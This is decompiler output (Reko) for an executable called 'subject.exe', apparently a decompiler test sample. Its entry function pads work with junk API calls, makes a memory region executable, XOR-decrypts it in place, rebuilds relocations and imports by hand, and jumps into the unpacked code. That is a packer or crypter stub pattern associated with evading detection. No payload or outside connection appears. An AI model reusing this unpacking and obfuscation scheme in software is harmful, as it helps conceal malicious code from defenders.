// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 esi_1224 = AddAce(null, 0x00, 0x00, null, 0x00) + 0x26 + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00);
	Eq_3 ebp_1008 = null;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		esi_1224 = esi_1224 - 0x22;
	VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x0658);
	struct Eq_675 * esp_997 = fp - 1656;
	struct Eq_678 * eax_1000 = null;
	do
	{
		if (ebp_1008 == esi_1224)
			ebp_1008 = null;
		eax_1000[0x00401490] = (struct Eq_678) (eax_1000[0x00401490] ^ ebp_1008[0x00404000]);
		eax_1000 = eax_1000 + 0x01;
		ebp_1008 = (Eq_3) (ebp_1008 + 0x01);
	} while (eax_1000 < (struct Eq_678 *) 5152);
	struct Eq_700 * ecx_1023 = &globals->t402770;
	word32 ebp_1029 = 0x00401210;
	uint32 dwLoc0660_1033 = 0x00;
	do
	{
		Eq_706 eax_1043 = ecx_1023->t0004;
		word16 * edx_1048 = (char *) &ecx_1023->t0004 + 0x04;
		if (eax_1043 - 0x08 >> 0x01 > 0x00)
		{
			uint32 esi_1202 = eax_1043 - 0x08 >> 0x01;
			do
			{
				ui32 eax_1205 = (word32) *edx_1048;
				if ((eax_1205 & 0xF000) == 0x3000)
				{
					struct Eq_728 * eax_1216 = (eax_1205 & 0x0FFF) + ecx_1023->dw0000;
					eax_1216->dw401210 = eax_1216->dw401210 + 0xF0401210;
				}
				edx_1048 = edx_1048 + 0x01;
				esi_1202 = esi_1202 - 0x01;
			} while (esi_1202 != 0x00);
		}
		Eq_706 eax_1052 = ecx_1023->t0004;
		uint32 edx_1054 = (word32) eax_1052.u0 + dwLoc0660_1033;
		ecx_1023 = ecx_1023 + eax_1052;
		dwLoc0660_1033 = edx_1054;
	} while (edx_1054 < 228);
	struct Eq_752 * edi_1061 = &globals->t401F6C;
	edi_1089 = edi_1061;
	ebp_1091 = ebp_1029;
	esp_1094 = esp_997;
	if (globals->dw401F7C != 0x00)
	{
		do
		{
			struct Eq_752 * edi_1089;
			word32 ebp_1091;
			struct Eq_675 * esp_1094;
			esp_1094 = esp_1094 - 0x04 + 0x14;
			esp_1094->dw0000 = edi_1089->dw000C + ebp_1091;
			Eq_802 eax_1099 = LoadLibraryA(esp_1094->dw0000);
			esp_1094[0x07] = (struct Eq_675) eax_1099;
			if (eax_1099 != null)
			{
				word32 ecx_1122 = edi_1089->dw0000;
				if (ecx_1122 == 0x00)
					ecx_1122 = edi_1089->dw0010;
				word32 * ebx_1132 = (word32) esp_1094[0x05].dw0000 + edi_1089->dw0010;
				word32 * ebp_1133 = ebp_1091 + ecx_1122;
				if (*ebp_1133 != 0x00)
				{
					while (true)
					{
						Eq_860 eax_1171;
						int32 ecx_1161 = *ebp_1133;
						word16 cx_1163 = (word16) ecx_1161;
						if (ecx_1161 < 0x00)
						{
							LPCSTR * esp_1184 = esp_1094 - 0x04;
							*esp_1184 = (LPCSTR *) (word32) cx_1163;
							*(esp_1184 - 0x04) = (HMODULE *) eax_1099;
							eax_1171 = GetProcAddress(*(esp_1184 - 0x04), *esp_1184);
						}
						else
						{
							LPCSTR * esp_1194 = esp_1094 - 0x04;
							*esp_1194 = (word32) esp_1094[0x05].dw0000 + (ecx_1161 + 0x02);
							*(esp_1194 - 0x04) = (HMODULE *) eax_1099;
							eax_1171 = GetProcAddress(*(esp_1194 - 0x04), *esp_1194);
						}
						*ebx_1132 = (word32) eax_1171;
						esp_1094 = esp_1094 - 0x08;
						ebp_1133 = ebp_1133 + 0x01;
						ebx_1132 = ebx_1132 + 0x01;
						if (*ebp_1133 == 0x00)
							break;
						eax_1099 = (Eq_802) esp_1094[0x07];
					}
					edi_1089 = (struct Eq_752 *) esp_1094[0x06];
				}
				ebp_1091 = esp_1094->dw0000;
			}
			edi_1089 = edi_1089 + 0x01;
			esp_1094[0x06] = (struct Eq_675) edi_1089;
		} while (edi_1089->dw0010 != 0x00);
	}
	ptr32 esp_1068;
	byte SCZO_1069;
	word32 ebx_1070;
	word32 ebp_1071;
	word32 esi_1072;
	word32 edi_1073;
	byte SZO_1074;
	byte C_1075;
	word32 eax_1076;
	byte Z_1077;
	byte cl_1078;
	word32 ecx_1079;
	word32 edx_1080;
	byte S_1081;
	word16 cx_1082;
	globals->t401C60();
	*(esp_1068 - 0x04) = 0x00;
	ExitProcess(*(esp_1068 - 0x04));
}

